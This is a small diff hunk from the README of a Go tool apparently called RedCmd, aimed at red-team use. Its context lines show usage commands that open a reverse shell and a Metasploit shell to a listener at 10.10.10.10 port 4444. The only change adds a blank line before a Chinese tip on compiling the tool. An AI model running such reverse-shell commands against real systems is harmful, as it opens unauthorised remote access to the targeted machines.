@@ -28,6 +28,7 @@ go run redcmd.go revshell 10.10.10.10 4444
 go run redcmd.go msfshell 10.10.10.10 4444
 ```
 <img width="910" alt="image" src="https://github.com/sspsec/RedCmd/assets/142762749/0b037ee5-87b2-4ddc-8f7d-0422723521e1">
+
 使用go编译后加入环境变量使用更佳
 ``` bash
 go build redcmd.go
